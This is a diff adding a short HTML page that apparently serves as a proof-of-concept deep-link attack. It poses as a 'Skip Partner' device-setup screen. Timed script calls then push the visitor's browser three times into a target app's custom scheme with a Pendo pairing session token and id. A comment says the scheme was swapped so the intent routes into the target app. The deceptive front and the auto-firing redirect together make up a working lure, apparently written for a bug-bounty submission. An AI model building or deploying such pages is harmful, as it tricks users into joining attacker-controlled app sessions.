@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Skip Partner — Continue Setup</title>
+</head>
+<body style="font-family:-apple-system,sans-serif;text-align:center;padding-top:70px;background:#f7f9fa">
+<h2 style="color:#172026">Skip Partner</h2>
+<p>Continue your device setup…</p>
+<p id="st" style="color:#888">Launching…</p>
+<script>
+// Pendo mobile pairing session (sub 5291074547548160)
+// scheme swapped to the target app's scheme so the intent routes into it
+var url = "pendo-934e578c://pairing?sessionToken=PLACEHOLDER_SESSION_TOKEN&sid=PLACEHOLDER_SID";
+function fire(){
+  var s=document.getElementById("st");
+  if(s) s.innerText="Opening Skip Partner…";
+  window.location = url;
+}
+setTimeout(fire, 700);
+setTimeout(fire, 2500);
+setTimeout(fire, 5000);
+</script>
+</body>
+</html>
